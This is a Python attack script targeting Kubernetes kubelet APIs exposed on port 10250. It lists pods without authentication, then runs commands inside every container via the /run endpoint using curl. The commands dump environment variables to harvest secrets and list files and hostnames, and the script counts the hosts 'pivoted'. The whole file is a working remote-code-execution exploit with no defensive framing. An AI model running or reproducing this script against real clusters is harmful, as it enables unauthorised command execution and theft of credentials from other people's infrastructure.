import requests
import json
import sys
import subprocess

target = sys.argv[1]


def getPodInfo(target_in):
    url = "https://{}:10250/pods".format(target_in)
    response  = requests.get(url,timeout=3,verify=False)
    json_data = response.json()
    if json_data:
        return json_data



def rce_cmd_hostname(rce_url):
    cmd = "curl -k -XPOST \"{}\" -d \"cmd=cat /etc/hostname\"".format(rce_url)
    try:
       mycmd_result = subprocess.getoutput(cmd)
       if mycmd_result:
          return mycmd_result
    except Exception as ex3:
        print(ex3)

def rce_cmd_secrets(rce_url):
    cmd = "curl -k -XPOST \"{}\" -d \"cmd=env\"".format(rce_url)
    try:
       mycmd_result = subprocess.getoutput(cmd)
       if mycmd_result:
          return mycmd_result
    except Exception as ex3:
        print(ex3)

def rce_cmd_psaux(rce_url):
    print(rce_url)
    cmd = "curl -k -XPOST \"{}\" -d cmd=\"ls coredns \"/".format(rce_url)
    try:
       mycmd_result = subprocess.getoutput(cmd)
       if mycmd_result:
          return mycmd_result
    except Exception as ex3:
        print(ex3)

def rce_cmd_file_lister(rce_url):
    cmd = "curl -k -XPOST \"{}\" -d \"cmd=ls -lash\"".format(rce_url)
    try:
       mycmd_result = subprocess.getoutput(cmd)
       if mycmd_result:
          return mycmd_result
    except Exception as ex3:
        print(ex3)


def get_pod_names(Podresults):
    pod_names = []
    if Podresults:
       for k,v in Podresults.items(): 
           for item in v:
               try:
                  for sub_item in v:
                      #print(sub_item)
                      local_metadata = sub_item['metadata']
                      pod_name = local_metadata['name']
                      namespace = local_metadata['namespace']
                      containers = sub_item['spec']
                      containers_name = ""
                      if containers:
                         for container_key,container_data in containers.items():
                            if "containers" in container_key:
                                containers_name = container_data
                                for cont_inf in containers_name:
                                    containers_name = cont_inf['name'] 
                                    #print(name,namespace,containers_name)
                    
                      
                      if local_metadata['name']:
                         if namespace: 
                            # precursor for exploitation is namespace pod_name container_name joined into api call
                            rce_url = "https://"+target+":10250/run/{}/{}/{}".format(namespace,pod_name,containers_name)
                            pod_names.append(rce_url)
                            print(rce_url)
                           
               except Exception as ex1:
                 #print(ex1)
                 pass
    if pod_names:
       return pod_names
   
Podresults = getPodInfo(target)
Pod_Names = get_pod_names(Podresults)

internal_hosts_pivoted = 0
if Pod_Names:
   for pod_name in Pod_Names:
       try:
           result = rce_cmd_psaux(pod_name)
           print(result)
           
           secrets = rce_cmd_secrets(pod_name)
           files_found = rce_cmd_file_lister(pod_name)
           internal_hosts = rce_cmd_hostname(pod_name)
           if files_found:
              print(files_found)
              internal_hosts_pivoted +=1
           
       except Exception as ex2:
          #print(ex2)
          pass
   
print("*"*50)
print("Discovered {}".format(str(internal_hosts_pivoted)))
